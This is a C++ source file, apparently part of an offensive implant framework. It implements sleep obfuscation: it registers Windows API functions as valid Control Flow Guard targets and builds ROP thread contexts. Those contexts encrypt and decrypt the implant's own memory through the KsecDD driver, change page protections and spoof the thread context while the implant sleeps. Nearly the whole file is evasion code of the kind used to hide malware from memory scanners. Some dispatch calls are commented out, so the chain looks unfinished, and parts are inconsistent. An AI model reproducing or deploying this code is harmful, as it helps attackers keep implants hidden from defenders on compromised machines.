#include "core/corelib.hpp"

BOOL AddValidCallTarget(void* pointer) {
    HEXANE

    PIMAGE_DOS_HEADER                dos_head    = { };
    PIMAGE_NT_HEADERS                nt_head     = { };
    CFG_CALL_TARGET_INFO             target_info = { };
    EXTENDED_PROCESS_INFORMATION     ex_procinfo = { };

    size_t                           length      = 0;
    bool                             success     = false;

    dos_head = P_IMAGE_DOS_HEADER(Ctx->base.address);
    nt_head  = P_IMAGE_NT_HEADERS(Ctx->base.address, dos_head);

    length   = nt_head->OptionalHeader.SizeOfImage;
    length   = (length + 0x1000 - 1) &~ (0x1000 - 1);

    ex_procinfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
    ex_procinfo.ExtendedProcessInfoBuffer = 0;

    if (NT_SUCCESS(ntstatus = Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, (ProcessCookie | ProcessUserModeIOPL)), &ex_procinfo, sizeof(ex_procinfo ), nullptr))) {
        target_info.Flags  = CFG_CALL_TARGET_VALID;
        target_info.Offset = U_PTR(pointer) - U_PTR(Ctx->base.address);

        auto base = Ctx->base.address;
        if (Ctx->nt.SetProcessValidCallTargets(NtCurrentProcess(), &base, length, 1, &target_info)) {
            success_(true);
        }
    }

    defer:
    return success;
}

BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
    HEXANE

    HANDLE              rop_thread      = { };
    HANDLE              src_thread      = { };
    HANDLE              sync_event      = { };
    HANDLE              ksecdd          = { };

    bool success = true;

    PWCHAR              ksecdd_name     = { };
    CLIENT_ID           src_cid         = { };
    UNICODE_STRING      src_uni         = { };
    IO_STATUS_BLOCK     ksecdd_iostat   = { };
    OBJECT_ATTRIBUTES   src_object      = { };
    OBJECT_ATTRIBUTES   sec_object      = { };

    ULONG               success_count   = 0;

    PCONTEXT          rop_buffer = { };
    PCONTEXT          ContextRopExt = { };
    PCONTEXT          ContextRopDel = { };
    PCONTEXT          ContextRopSet = { };
    PCONTEXT          ContextRopRes = { };
    PCONTEXT          ContextRopEnc = { };
    PCONTEXT          ContextRopDec = { };
    PCONTEXT          stolen = { };

    PVOID             ContextMemPtr = { };
    PVOID             ContextResPtr = { };

    SIZE_T            ContextMemLen = 0;
    SIZE_T            ContextResLen = 0;

    ULONG             ContextMemPrt = 0;
    ULONG             ContextResPrt = 0;

    PCONTEXT          ContextCtxCap = { };
    PCONTEXT          ContextCapMem = { };
    PCONTEXT          ContextCtxSet = { };
    PCONTEXT          ContextCtxRes = { };


    ContextMemPtr = C_PTR(Ctx->base.address);
    ContextMemLen = Ctx->base.size;

    ContextResPtr = C_PTR(Ctx->base.address);
    ContextResLen = Ctx->base.size;

    AddValidCallTarget(C_PTR(Ctx->win32.ExitThread));
    //AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
    AddValidCallTarget(C_PTR(Ctx->nt.NtTestAlert));
    //AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
    AddValidCallTarget(C_PTR(Ctx->nt.NtGetContextThread));
    AddValidCallTarget(C_PTR(Ctx->nt.NtSetContextThread));
    AddValidCallTarget(C_PTR(Ctx->nt.NtWaitForSingleObject));
    AddValidCallTarget(C_PTR(Ctx->nt.NtDeviceIoControlFile));
    AddValidCallTarget(C_PTR(Ctx->nt.NtProtectVirtualMemory));

    src_object.Length = sizeof( src_object );
    sec_object.Length = sizeof( sec_object );

    ksecdd_name = OBFW(L"\\Device\\KsecDD");

    Ctx->nt.RtlInitUnicodeString( &src_uni, ksecdd_name );
    InitializeObjectAttributes( &sec_object, &src_uni, 0, nullptr, nullptr );

    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtOpenFile(&ksecdd, SYNCHRONIZE | FILE_READ_DATA, &sec_object, &ksecdd_iostat, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0))) {
        success_(false);
    }

    src_cid.UniqueProcess = nullptr;
    src_cid.UniqueThread  = NtCurrentTeb()->ClientId.UniqueThread;

    if (
        !NT_SUCCESS(ntstatus = Ctx->nt.NtOpenThread(&src_thread, THREAD_ALL_ACCESS, &src_object, &src_cid)) ||
        !NT_SUCCESS(ntstatus = Ctx->nt.NtCreateThreadEx(&rop_thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), C_PTR( fake_frame->Rip ), NULL, TRUE, 0, 0xFFFF, 0xFFFF, NULL))) {
        success_(false);
    }

    //ntstatus = Ctx->nt.NtCreateEvent(&sync_event, EVENT_ALL_ACCESS, NULL, 1, FALSE);

    stolen = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
    stolen->ContextFlags = CONTEXT_FULL;

    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtGetContextThread(rop_thread, stolen))) {
        success_(false);
    }

    rop_buffer = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

#if defined( _WIN64 )
    *rop_buffer = *stolen;
    rop_buffer->ContextFlags    = CONTEXT_FULL;
    rop_buffer->Rsp             = U_PTR( stolen->Rsp );
    rop_buffer->Rip             = U_PTR( Ctx->nt.NtWaitForSingleObject );
    rop_buffer->Rcx             = U_PTR( sync_event );
    rop_buffer->Rdx             = false;
    rop_buffer->R8              = NULL;

    *(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
#else
    *rop_buffer                 = *stolen;
	rop_buffer->ContextFlags    = CONTEXT_FULL;
	rop_buffer->Esp             = U_PTR(stolen->Esp - 0x100);
	rop_buffer->Eip             = U_PTR(Ctx->nt.NtWaitForSingleObject);
	*(uintptr_t*)(rop_buffer->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;

	// insert argument chain here
#endif

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_buffer, NULL, NULL);
    ContextRopSet = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextRopSet = *stolen;
    ContextRopSet->ContextFlags = CONTEXT_FULL;
    ContextRopSet->Rsp          = U_PTR(stolen->Rsp - 0x1000);
    ContextRopSet->Rip          = U_PTR(Ctx->nt.NtProtectVirtualMemory);
    ContextRopSet->Rcx          = U_PTR(NtCurrentProcess());
    ContextRopSet->Rdx          = U_PTR(&ContextMemPtr);
    ContextRopSet->R8           = U_PTR(&ContextMemLen);
    ContextRopSet->R9           = PAGE_READWRITE;

    *(uintptr_t*)(ContextRopSet->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
    *(uintptr_t*)(ContextRopSet->Rsp + 0x28) = (uintptr_t) &ContextMemPrt;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopSet, NULL, NULL);
    ContextRopEnc = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextRopEnc = *stolen;
    ContextRopEnc->ContextFlags = CONTEXT_FULL;
    ContextRopEnc->Rsp          = U_PTR(stolen->Rsp - 0x2000);
    ContextRopEnc->Rip          = U_PTR(Ctx->nt.NtDeviceIoControlFile);
    ContextRopEnc->Rcx          = U_PTR(ksecdd);
    ContextRopEnc->Rdx          = NULL;
    ContextRopEnc->R8           = NULL;
    ContextRopEnc->R9           = NULL;

    *(uintptr_t*)(ContextRopEnc->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
    *(uintptr_t*)(ContextRopEnc->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
    *(uintptr_t*)(ContextRopEnc->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_ENCRYPT_MEMORY;
    *(uintptr_t*)(ContextRopEnc->Rsp + 0x38) = (uintptr_t) ContextMemPtr;
    *(uintptr_t*)(ContextRopEnc->Rsp + 0x40) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
    *(uintptr_t*)(ContextRopEnc->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
    *(uintptr_t*)(ContextRopEnc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopEnc, NULL, NULL);
    ContextCtxCap = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));
    ContextCapMem = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextCtxCap = *stolen;
    ContextCapMem->ContextFlags = CONTEXT_FULL;
    ContextCtxCap->ContextFlags = CONTEXT_FULL;
    ContextCtxCap->Rsp          = U_PTR( stolen->Rsp );
    ContextCtxCap->Rip          = U_PTR( Ctx->nt.NtGetContextThread );
    ContextCtxCap->Rcx          = U_PTR( src_thread );
    ContextCtxCap->Rdx          = U_PTR( ContextCapMem );

    *(uintptr_t*)(ContextCtxCap->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxCap, NULL, NULL);
    ContextCtxSet = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextCtxSet = *stolen;
    ContextCtxSet->ContextFlags = CONTEXT_FULL;
    ContextCtxSet->Rsp          = U_PTR( stolen->Rsp );
    ContextCtxSet->Rip          = U_PTR( Ctx->nt.NtSetContextThread );
    ContextCtxSet->Rcx          = U_PTR( src_thread );
    ContextCtxSet->Rdx          = U_PTR( fake_frame );

    *(uintptr_t*)(ContextCtxSet->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxSet, NULL, NULL);
    ContextRopDel = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

//
// WAIT FUNCTION GOES HERE
//

//
// Swap this with NtWaitForSingleObject
// for practicality purposes so that
// we can use it on objects.
//

    *ContextRopDel = *stolen;
    ContextRopDel->ContextFlags = CONTEXT_FULL;
    ContextRopDel->Rsp          = U_PTR(stolen->Rsp);
    ContextRopDel->Rip          = U_PTR(Ctx->nt.NtDelayExecution);
    ContextRopDel->Rcx          = false;
    ContextRopDel->Rdx          = U_PTR(Timeout);

    *(uintptr_t*)(ContextRopDel->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDel, NULL, NULL);

//
// WAIT FUNCTION ENDS HERE
//

    ContextRopDec = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextRopDec = *stolen;
    ContextRopDec->ContextFlags = CONTEXT_FULL;
    ContextRopDec->Rsp          = U_PTR(stolen->Rsp - 0x3000 );
    ContextRopDec->Rip          = U_PTR(Ctx->nt.NtDeviceIoControlFile );
    ContextRopDec->Rcx          = U_PTR(ksecdd);
    ContextRopDec->Rdx          = NULL;
    ContextRopDec->R8           = NULL;
    ContextRopDec->R9           = NULL;

    *(uintptr_t*)(ContextRopDec->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_DECRYPT_MEMORY;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x38) = (uintptr_t) ContextMemPtr;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x40) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
    *(uintptr_t*)(ContextRopDec->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
    *(uintptr_t*)(ContextRopDec->Rsp + 0x50) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopDec, NULL, NULL);
    ContextCtxRes = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextCtxRes = *stolen;
    ContextCtxRes->ContextFlags = CONTEXT_FULL;
    ContextCtxRes->Rsp          = U_PTR(stolen->Rsp);
    ContextCtxRes->Rip          = U_PTR(Ctx->nt.NtSetContextThread);
    ContextCtxRes->Rcx          = U_PTR(src_thread);
    ContextCtxRes->Rdx          = U_PTR(ContextCapMem);

    *(uintptr_t*)(ContextCtxRes->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextCtxRes, NULL, NULL);
    ContextRopRes = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextRopRes = *stolen;
    ContextRopRes->ContextFlags = CONTEXT_FULL;
    ContextRopRes->Rsp          = U_PTR( stolen->Rsp - 0x1000 );
    ContextRopRes->Rip          = U_PTR( Ctx->nt.NtProtectVirtualMemory );
    ContextRopRes->Rcx          = U_PTR( NtCurrentProcess() );
    ContextRopRes->Rdx          = U_PTR( &ContextResPtr );
    ContextRopRes->R8           = U_PTR( &ContextResLen );
    ContextRopRes->R9           = PAGE_EXECUTE_READWRITE;

    *(uintptr_t*)(ContextRopRes->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert ;
    *(uintptr_t*)(ContextRopRes->Rsp + 0x28) = (uintptr_t) &ContextResPrt;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopRes, NULL, NULL);
    ContextRopExt = R_CAST(PCONTEXT, x_malloc(sizeof(CONTEXT)));

    *ContextRopExt = *stolen;
    ContextRopExt->ContextFlags = CONTEXT_FULL;
    ContextRopExt->Rsp          = U_PTR(stolen->Rsp );
    ContextRopExt->Rip          = U_PTR(Ctx->win32.ExitThread );
    ContextRopExt->Rcx          = NULL;

    *(uintptr_t*)(ContextRopExt->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;

    //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, ContextRopExt, NULL, NULL);
    //ntstatus = Ctx->nt.NtAlertResumeThread(rop_thread, &success_count);
    //ntstatus = Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, NULL);

    defer:
    if (ContextRopDec)  { x_free(ContextRopDec); }
    if (ContextRopEnc)  { x_free(ContextRopEnc); }
    if (ContextCtxRes)  { x_free(ContextCtxRes); }
    if (ContextCtxSet)  { x_free(ContextCtxSet); }
    if (ContextCtxCap)  { x_free(ContextCtxCap); }
    if (ContextCapMem)  { x_free(ContextCapMem); }
    if (ContextRopRes)  { x_free(ContextRopRes); }
    if (ContextRopSet)  { x_free(ContextRopSet); }
    if (ContextRopDel)  { x_free(ContextRopDel); }
    if (ContextRopExt)  { x_free(ContextRopExt); }
    if (rop_buffer)     { x_free(rop_buffer); }
    if (stolen)         { x_free(stolen); }

    if (rop_thread) {
        Ctx->nt.NtTerminateThread(rop_thread, ERROR_SUCCESS);
        Ctx->nt.NtClose( rop_thread );
    }

    if (src_thread) { Ctx->nt.NtClose(src_thread); }
    if (sync_event) { Ctx->nt.NtClose(sync_event); }
    if (ksecdd)     { Ctx->nt.NtClose(ksecdd); }

    return ntstatus;
};